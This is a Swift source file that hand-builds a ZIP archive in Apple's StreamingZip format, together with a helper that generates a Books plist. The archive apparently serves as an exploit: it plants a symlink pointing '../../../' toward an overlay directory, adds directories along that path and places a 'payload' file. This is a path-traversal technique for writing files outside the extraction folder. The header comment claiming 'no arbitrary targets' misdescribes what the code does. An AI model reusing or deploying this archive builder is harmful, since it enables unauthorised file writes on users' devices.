import Foundation

/// Minimal ZIP STORE writer for Apple's StreamingZip format. No compression or arbitrary targets.
public enum StreamingArchive {
    private struct Entry { let name: String; let data: Data; let mode: UInt32 }
    public static func make(payload: Data) throws -> Data {
        let target = Compatibility.overlayDirectory.dropFirst()
        let metadata = try PropertyListSerialization.data(fromPropertyList: ["Version": 2], format: .binary, options: 0)
        var entries = [Entry(name: "META-INF/", data: Data(), mode: 0o40755), Entry(name: "META-INF/com.apple.ZipMetadata.plist", data: metadata, mode: 0o100600)]
        for name in ["p0/", "p0/p1/", "p0/p1/p2/"] { entries.append(Entry(name: name, data: Data(), mode: 0o40755)) }
        entries.append(Entry(name: "p0/p1/p2/link", data: Data("../../../\(target)".utf8), mode: 0o120777))
        var cursor = ""
        for part in target.split(separator: "/") { cursor += part + "/"; entries.append(Entry(name: cursor, data: Data(), mode: 0o40755)) }
        entries.append(Entry(name: "payload", data: payload, mode: 0o100600))
        var output = Data(), central = Data()
        for entry in entries {
            let name = Data(entry.name.utf8), offset = UInt32(output.count), crc = crc32(entry.data), count = UInt32(entry.data.count)
            var extra = Data(); extra.le(UInt16(0x5a53)); extra.le(UInt16(2)); extra.le(UInt16(entry.mode & 0xffff))
            output.le(UInt32(0x04034b50)); output.le(UInt16(20)); output.le(UInt16(0)); output.le(UInt16(0)); output.le(UInt16(0)); output.le(UInt16(0x5d21)); output.le(crc); output.le(count); output.le(count); output.le(UInt16(name.count)); output.le(UInt16(extra.count)); output.append(name); output.append(extra); output.append(entry.data)
            central.le(UInt32(0x02014b50)); central.le(UInt16(0x0314)); central.le(UInt16(20)); central.le(UInt16(0)); central.le(UInt16(0)); central.le(UInt16(0)); central.le(UInt16(0x5d21)); central.le(crc); central.le(count); central.le(count); central.le(UInt16(name.count)); central.le(UInt16(extra.count)); central.le(UInt16(0)); central.le(UInt16(0)); central.le(UInt16(0)); central.le(entry.mode << 16); central.le(offset); central.append(name); central.append(extra)
        }
        let centralOffset = UInt32(output.count); output.append(central)
        output.le(UInt32(0x06054b50)); output.le(UInt16(0)); output.le(UInt16(0)); output.le(UInt16(entries.count)); output.le(UInt16(entries.count)); output.le(UInt32(central.count)); output.le(centralOffset); output.le(UInt16(0))
        return output
    }
    public static func crc32(_ data: Data) -> UInt32 {
        var crc: UInt32 = 0xffffffff
        for byte in data { crc ^= UInt32(byte); for _ in 0..<8 { crc = (crc >> 1) ^ (crc & 1 == 1 ? 0xedb88320 : 0) } }
        return crc ^ 0xffffffff
    }
    public static func books(identifiers: [String]) throws -> Data {
        let rows = identifiers.enumerated().map { ["Persistent ID": $0.element, "Item ID": String($0.offset + 1), "DSID": "1"] }
        return try PropertyListSerialization.data(fromPropertyList: ["Books": rows], format: .binary, options: 0)
    }
}
private extension Data {
    mutating func le<T: FixedWidthInteger>(_ value: T) { var v = value.littleEndian; Swift.withUnsafeBytes(of: &v) { append(contentsOf: $0) } }
}
